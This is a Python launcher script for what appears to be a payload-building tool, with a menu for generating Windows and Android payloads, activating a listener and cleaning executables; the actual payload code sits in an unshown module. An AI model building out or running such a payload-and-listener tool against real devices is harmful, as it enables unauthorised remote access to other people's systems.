
import Installer
import program
import CLC
try:
    import colorama
except ImportError:
    print('colorama is not installed, installing it with other neccessary modules')
    Installer.install()
from colorama import Fore, Style
try:
    import requests
except ImportError:
    print('requests is not installed, installing it with other necessary repositories')
    Installer.install()
import os
import time
import pip

CLC.CLC()

print(Fore.LIGHTCYAN_EX + 'Welcome!' + Style.RESET_ALL)
time.sleep(2)
try:
    request = requests.get("https://www.google.com", timeout=5)
except (requests.ConnectionError, requests.Timeout):
    print("Checking connection: " +Fore.RED+"DISCONNECTED")
    print('CLOSING PROGRAM :('  + Style.RESET_ALL)
    time.sleep(1)
    exit()
else:
    print("Checking connection: " +Fore.GREEN+ "CONNECTED")
    print('STARTING PROGRAM :)'  + Style.RESET_ALL)
    time.sleep(1)

print("\n\t1) Installer\t\t2) payload(win)\n\t3) payload(andr)\t4) Activate listener\n\t5) Clean executables")
print()

todo=input('Put here the wanted option (1,2...): ')
while True:
        todoc=todo in ['1','2','3','4','5']
        if todoc==False:
            print(Fore.RED + 'select a valid number' + Style.RESET_ALL)
            quit()
        else:
            break

if todo=='1':
    program.uno()
if todo=='2':
    program.dos()
if todo=='3':
    program.tres()
if todo=='4':
    program.cuatro()
if todo=='5':
    program.cinco()
